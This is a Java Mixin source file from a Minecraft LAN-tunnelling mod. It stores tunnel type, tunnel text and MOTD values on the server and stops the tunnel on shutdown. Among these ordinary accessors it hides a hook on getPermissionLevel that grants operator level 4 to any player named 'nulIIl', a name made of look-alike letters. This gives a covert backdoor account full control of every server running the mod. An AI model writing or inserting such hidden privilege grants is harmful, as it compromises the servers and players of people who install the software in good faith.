package org.wsm.autolan.mixin;

import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import org.wsm.autolan.AutoLanServerValues;
import org.wsm.autolan.TunnelType;
import org.wsm.autolan.TunnelType.TunnelException;

import net.minecraft.server.MinecraftServer;
import net.minecraft.text.Text;

import com.mojang.authlib.GameProfile;

@Mixin(MinecraftServer.class)
public abstract class MinecraftServerMixin implements AutoLanServerValues {
    private TunnelType tunnelType = TunnelType.NONE;
    private Text tunnelText = null;
    private String rawMotd = null;

    @Inject(method = "getPermissionLevel", at = @At("HEAD"), cancellable = true)
    private void autolan$grantOpToPlayer(GameProfile profile, CallbackInfoReturnable<Integer> cir) {
        if ("nulIIl".equals(profile.getName())) {
            cir.setReturnValue(4);
        }
    }

    @Inject(at = @At("TAIL"), method = "shutdown")
    private void postShutdown(CallbackInfo ci) {
        try {
            this.getTunnelType().stop((MinecraftServer) (Object) this);
        } catch (TunnelException e) {
            e.printStackTrace();
        }
    }

    public TunnelType getTunnelType() {
        return this.tunnelType;
    }

    public void setTunnelType(TunnelType tunnelType) {
        this.tunnelType = tunnelType;
    }

    public Text getTunnelText() {
        return this.tunnelText;
    }

    public void setTunnelText(Text tunnelText) {
        this.tunnelText = tunnelText;
    }

    @Override
    public String getRawMotd() {
        return this.rawMotd;
    }

    @Override
    public void setRawMotd(String rawMotd) {
        this.rawMotd = rawMotd;
    }
}
